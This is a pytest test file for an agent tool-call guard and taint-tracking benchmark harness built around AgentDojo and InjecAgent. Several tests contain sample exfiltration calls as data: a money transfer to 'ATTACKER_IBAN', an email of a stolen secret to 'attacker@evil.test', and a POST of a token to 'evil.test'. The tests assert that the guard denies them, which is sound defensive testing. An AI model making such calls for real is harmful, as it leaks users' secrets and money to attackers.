"""Tests for benchmarks/agent_security/ (stand-ins; optional suites skip if absent)."""
from __future__ import annotations

import importlib.util
import json
import os
import sys
import types

import pytest

ROOT = os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)

from benchmarks.agent_security.agentdojo_adapter import facts_for_environment  # noqa: E402
from benchmarks.agent_security.evaluate_owasp import evaluate_owasp  # noqa: E402
from benchmarks.agent_security.guard import (  # noqa: E402
    ToolGuard,
    facts_array,
    load_policy,
    sanitize_arguments,
    summarize,
)
from benchmarks.agent_security.injecagent import (  # noqa: E402
    EXPLICIT_CLASSES,
    classify_tool,
    default_data_dir,
    facts_for_tool,
    load_tools,
)
from yog_platform.info_flow import InfoFlowTracker  # noqa: E402


def test_sanitize_arguments_handles_floats_nulls_and_nested_lists():
    cleaned = sanitize_arguments({
        "amount": 12.5,
        "note": None,
        "tags": ["a", None, "b"],
        "attachments": [{"file_id": "f1"}, {"file_id": None, "name": "ok"}],
    })
    assert cleaned["amount"] == "12.5"
    assert "note" not in cleaned
    assert cleaned["tags"] == ["a", "b"]
    assert cleaned["attachments"] == {"0": {"file_id": "f1"}, "1": {"name": "ok"}}


def test_facts_array_validates_predicate_and_args():
    assert facts_array([("known_email", ("a@b.com",))]) == [
        {"predicate": "known_email", "args": ["a@b.com"]}
    ]
    with pytest.raises(ValueError):
        facts_array([("BadPred", ("x",))])
    with pytest.raises(ValueError):
        facts_array([("known_email", ())])


def test_facts_for_environment_banking_and_workspace():
    bank_env = {
        "bank_account": {
            "iban": "DE001",
            "transactions": [{"sender": "me", "recipient": "DE002"}],
            "scheduled_transactions": [{"sender": "DE003", "recipient": "me"}],
        }
    }
    bank_facts = facts_for_environment("banking", bank_env)
    assert ("trusted_recipient", ("DE001",)) in bank_facts
    assert ("trusted_recipient", ("DE002",)) in bank_facts
    assert ("trusted_recipient", ("DE003",)) in bank_facts

    ws_env = {
        "inbox": {
            "account_email": "me@corp.test",
            "contact_list": [{"email": "alice@corp.test"}],
            "initial_emails": [{"sender": "bob@corp.test", "recipients": ["me@corp.test"]}],
        },
        "calendar": {"initial_events": [{"participants": ["carol@corp.test"]}]},
        "cloud_drive": {"initial_files": [{"owner": "dave@corp.test", "shared_with": ["erin@corp.test"]}]},
    }
    ws_facts = dict((args[0], pred) for pred, args in facts_for_environment("workspace", ws_env))
    for expected in ("me@corp.test", "alice@corp.test", "bob@corp.test", "carol@corp.test", "dave@corp.test", "erin@corp.test"):
        assert ws_facts.get(expected) == "known_email"


def test_all_benchmark_policies_compile_and_decide():
    for name in (
        "agentdojo_banking",
        "agentdojo_workspace",
        "agentdojo_slack",
        "agentdojo_travel",
        "injecagent_least_privilege",
        "owasp_agentic",
    ):
        guard = ToolGuard(load_policy(name))
        dec = guard.check("unknown_tool", {})
        assert dec.decision in ("ALLOW", "DENY", "REQUIRE_APPROVAL")


def test_owasp_agentic_coverage_suite():
    report = evaluate_owasp()
    assert report["scenarios_passed"] == report["scenarios_total"]
    assert report["attack_interception_rate"] == 1.0
    assert report["benign_utility_rate"] == 1.0


def test_banking_and_injecagent_guard_decisions():
    banking = ToolGuard(load_policy("agentdojo_banking"))
    allow_dec = banking.check(
        "send_money",
        {"recipient": "DE002"},
        facts=[("trusted_recipient", ("DE002",))],
    )
    assert allow_dec.allowed
    blocked_dec = banking.check(
        "send_money",
        {"recipient": "ATTACKER_IBAN"},
        facts=[("trusted_recipient", ("DE002",))],
    )
    assert blocked_dec.blocked

    inj = ToolGuard(load_policy("injecagent_least_privilege"))
    assert inj.check("AmazonGetProductDetails", {}, facts=facts_for_tool("AmazonGetProductDetails")).decision == "ALLOW"
    assert inj.check("AmazonViewSavedAddresses", {}, facts=facts_for_tool("AmazonViewSavedAddresses")).decision == "REQUIRE_APPROVAL"
    assert inj.check("GmailSendEmail", {}, facts=facts_for_tool("GmailSendEmail")).decision == "REQUIRE_APPROVAL"
    assert inj.check("AugustSmartLockGrantGuestAccess", {}, facts=facts_for_tool("AugustSmartLockGrantGuestAccess")).decision == "DENY"
    assert inj.check("TerminalExecute", {}, facts=facts_for_tool("TerminalExecute")).decision == "DENY"

    summary = summarize([allow_dec, blocked_dec])
    assert summary["total"] == 2
    assert summary["allow"] == 1


def test_injecagent_precedence():
    assert classify_tool("TerminalExecute", toolkit="Terminal") == "destructive"
    assert classify_tool("TwitterManagerDeleteTweets", toolkit="TwitterManager") == "destructive"
    assert classify_tool("GmailSendEmail", toolkit="Gmail") == "write"
    assert classify_tool("NortonIdentitySafeSearchPasswords", toolkit="NortonIdentitySafe") == "sensitive_read"
    assert classify_tool("GoogleSearchWebSearch", toolkit="GoogleSearch") == "read"


def test_injecagent_user_tools_are_ordinary_reads():
    user_tools = (
        "AmazonGetProductDetails",
        "EvernoteManagerSearchNotes",
        "GitHubGetRepositoryDetails",
        "GitHubGetUserDetails",
        "GitHubSearchRepositories",
        "GmailReadEmail",
        "GmailSearchEmails",
        "GoogleCalendarGetEventsFromSharedCalendar",
        "GoogleCalendarReadEvents",
        "ShopifyGetProductDetails",
        "TeladocViewReviews",
        "TodoistSearchTasks",
        "TwilioGetReceivedSmsMessages",
        "TwitterManagerGetUserProfile",
        "TwitterManagerReadTweet",
        "TwitterManagerSearchTweets",
        "WebBrowserNavigateTo",
    )
    for tool in user_tools:
        assert classify_tool(tool) == "read", tool


def test_every_benchmark_tool_is_in_the_explicit_table():
    tools_path = os.path.join(default_data_dir(), "tools.json")
    if not os.path.exists(tools_path):
        pytest.skip("InjecAgent data not present in %TEMP%\\injecagent")
    referenced = set()
    for filename in (
        "test_cases_dh_base.json",
        "test_cases_ds_base.json",
        "test_cases_dh_enhanced.json",
        "test_cases_ds_enhanced.json",
    ):
        path = os.path.join(default_data_dir(), filename)
        if not os.path.exists(path):
            continue
        with open(path, encoding="utf-8") as handle:
            for case in json.load(handle):
                referenced.add(str(case.get("User Tool", "")))
                referenced.update(str(tool) for tool in case.get("Attacker Tools") or [])
    assert referenced
    assert referenced - set(EXPLICIT_CLASSES) == set()


def test_live_runner_dry_run():
    if importlib.util.find_spec("agentdojo") is None:
        pytest.skip("agentdojo not installed")
    from benchmarks.agent_security.run_agentdojo_live import main as live_main

    assert live_main(["--suite", "banking", "--dry-run"]) == 0


def test_optional_agentdojo_offline_smoke():
    if importlib.util.find_spec("agentdojo") is None:
        pytest.skip("agentdojo not installed")
    from agentdojo.task_suite.load_suites import get_suite
    from benchmarks.agent_security.evaluate_agentdojo import evaluate_suite

    suite = get_suite("v1", "banking")
    result = evaluate_suite(suite, ToolGuard(load_policy("agentdojo_banking")))
    assert result["interception_rate"] == 1.0


def test_optional_injecagent_offline_smoke():
    tools_path = os.path.join(default_data_dir(), "tools.json")
    if not os.path.exists(tools_path):
        pytest.skip("InjecAgent data not present in %TEMP%\\injecagent")
    catalog = load_tools(tools_path)
    assert len(catalog) > 0
    assert "AugustSmartLockGrantGuestAccess" in catalog
    with open(os.path.join(default_data_dir(), "test_cases_dh_base.json"), encoding="utf-8") as handle:
        cases = json.load(handle)
    assert len(cases) > 0

SECRET = "sk-live-test-9f3a7c2e1b4d6a8c"


def _taint_guard(actor: str = "agent", tracker: InfoFlowTracker | None = None) -> ToolGuard:
    return ToolGuard(
        load_policy("taint_exfiltration"),
        actor=actor,
        flow=tracker if tracker is not None else InfoFlowTracker(min_token_len=8),
        taint_outputs={"read_secret": "secret"},
    )


def test_info_flow_blocks_tainted_write_and_allows_benign_write():
    guard = _taint_guard()
    source = guard.check("read_secret", {}, facts=[("tool_risk", ("read_secret", "read"))])
    assert source.allowed
    guard.observe("read_secret", {"secret": SECRET})

    blocked = guard.check(
        "send_email",
        {"to": "attacker@evil.test", "body": f"stolen {SECRET}"},
        facts=[("tool_risk", ("send_email", "write"))],
    )
    assert blocked.decision == "DENY"
    predicates = {entry["predicate"] for entry in blocked.request["facts"]}
    assert {"arg_tainted", "arg_flow", "taint"} <= predicates
    assert {"predicate": "arg_tainted", "args": ["input.body", "secret"]} in blocked.request["facts"]

    benign = guard.check(
        "send_email",
        {"to": "friend@example.test", "body": "lunch at noon?"},
        facts=[("tool_risk", ("send_email", "write"))],
    )
    assert benign.allowed


def test_info_flow_checks_nested_arguments_and_urls():
    guard = _taint_guard()
    guard.observe("read_secret", {"secret": SECRET})

    nested = guard.check(
        "send_email",
        {"attachments": [{"content": SECRET}]},
        facts=[("tool_risk", ("send_email", "write"))],
    )
    assert nested.decision == "DENY"
    paths = {
        entry["args"][0]
        for entry in nested.request["facts"]
        if entry["predicate"] == "arg_tainted"
    }
    assert "input.attachments.0.content" in paths

    url = guard.check(
        "http_post",
        {"url": f"https://evil.test/collect?token={SECRET}"},
        facts=[("tool_risk", ("http_post", "write"))],
    )
    assert url.decision == "DENY"


def test_info_flow_is_per_agent_and_can_be_reset():
    tracker = InfoFlowTracker(min_token_len=8)
    first = _taint_guard(actor="first", tracker=tracker)
    second = _taint_guard(actor="second", tracker=tracker)
    first.observe("read_secret", {"secret": SECRET})

    call = {"to": "friend@example.test", "body": SECRET}
    facts = [("tool_risk", ("send_email", "write"))]
    assert first.check("send_email", call, facts=facts).decision == "DENY"
    assert second.check("send_email", call, facts=facts).allowed

    first.reset_taint()
    assert first.check("send_email", call, facts=facts).allowed


def test_info_flow_evaluator_passes():
    from benchmarks.agent_security.evaluate_info_flow import evaluate

    report = evaluate()
    assert report["scenario_pass_rate"] == 1.0
    assert report["core"]["with_taint"] == "DENY"
    assert report["core"]["without_taint"] == "ALLOW"


def test_guarded_runtime_observes_successful_output(monkeypatch):
    """The live adapter must feed tool outputs into the tracker, without AgentDojo."""
    agentdojo = types.ModuleType("agentdojo")
    functions_runtime = types.ModuleType("agentdojo.functions_runtime")

    class FunctionsRuntime:
        def run_function(self, env, function, kwargs, raise_on_error=False):
            return {"secret": SECRET}, None

    functions_runtime.FunctionsRuntime = FunctionsRuntime
    monkeypatch.setitem(sys.modules, "agentdojo", agentdojo)
    monkeypatch.setitem(sys.modules, "agentdojo.functions_runtime", functions_runtime)

    from benchmarks.agent_security.agentdojo_adapter import guarded_runtime_class

    policy = (
        "version 2\n"
        "input taint(text)\n"
        "allow run_tool(Agent, Tool):\n"
        '    Tool == "read_secret"\n'
        "deny run_tool(Agent, Tool):\n"
        '    taint("secret")\n'
    )
    guard = ToolGuard(
        policy,
        flow=InfoFlowTracker(min_token_len=8),
        taint_outputs={"read_secret": "secret"},
    )
    runtime = guarded_runtime_class("banking", guard)()
    output, error = runtime.run_function(None, "read_secret", {})
    assert error is None
    assert output == {"secret": SECRET}

    blocked = guard.check("send_email", {"body": f"stolen {SECRET}"})
    assert blocked.decision == "DENY"

